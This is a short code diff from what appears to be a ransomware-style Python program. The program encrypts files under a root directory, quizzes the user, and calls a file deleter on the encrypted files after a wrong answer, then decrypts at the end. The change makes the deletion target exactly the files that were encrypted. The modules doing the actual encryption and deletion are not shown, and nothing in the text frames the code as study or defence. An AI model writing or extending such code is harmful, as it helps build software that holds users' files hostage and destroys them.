@@ -17,7 +17,7 @@ if password != "basil":
     exit()
 
 
-encryptionManager.manage(0, rootDirectionary, key)
+filesChanged = encryptionManager.manage(0, rootDirectionary, key)
              
         
 
@@ -40,7 +40,7 @@ for i in range(6):
     if userInput != answer:
         print("Oh dear, oh dear")
         time.sleep(3)
-        fileDeleter.deleteFiles()
+        fileDeleter.deleteFiles(filesChanged)
 print("Your files will now be decrypted, have a nice day!")
 encryptionManager.manage(1, rootDirectionary, key)
 exit()        
